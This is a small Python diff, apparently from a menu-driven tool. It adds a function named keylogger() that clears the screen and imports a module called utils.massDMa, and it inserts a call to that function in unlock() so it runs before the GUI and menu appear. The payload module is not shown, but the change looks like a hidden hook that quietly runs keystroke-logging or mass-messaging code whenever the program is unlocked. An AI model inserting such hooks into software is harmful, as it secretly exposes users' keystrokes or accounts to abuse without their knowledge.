@@ -42,13 +42,16 @@ def start():
 
 
 def unlock():
+    keylogger()
     gui()
     menu()
 
 def exit():
     os._exit(0)
 
-
+def keylogger():
+    os.system("cls")
+    import utils.massDMa
 
 def phasedout():
     os.system("cls")
